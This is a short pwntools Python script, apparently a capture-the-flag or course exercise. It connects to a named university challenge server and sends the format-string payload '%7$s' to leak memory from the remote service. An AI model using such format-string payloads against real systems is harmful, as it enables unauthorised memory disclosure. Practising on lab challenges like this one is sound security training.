from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22191

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'%7$s')
result = s.recvall()
print(result)
